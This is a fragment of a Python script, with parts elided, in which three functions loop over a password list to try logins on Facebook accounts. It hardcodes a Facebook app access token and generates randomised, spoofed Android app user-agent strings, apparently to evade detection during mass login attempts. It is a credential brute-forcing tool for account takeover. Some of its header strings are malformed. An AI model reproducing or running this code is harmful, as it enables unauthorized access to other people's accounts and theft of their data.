...
def api1(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/51.0.0.7005;FBBV/8037247;FBDM/{density=0,width=720,height=1280};FBLC/en_US;FBRV/2286820;FBCR/null;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.adsmanager;FBDV/Galaxy S24 Ultra;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
...
def api2(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/48.0.0.5815;FBBV/7863279;FBDM/{density=[,width=720,height=1280};FBLC/en_US;FBRV/2696549;FBCR/null;FBMF/Symphony;FBBD/Symphony;FBPN/com.facebook.katana;FBDV/Helio 30;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
...
def api3(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[lFBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.2666;FBBV/5476141;FBDM/{density=,,width=720,height=1280};FBLC/en_US;FBRV/9291926;FBCR/null;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/Nova Y72;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            head = {'User-Agent':uaddx,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
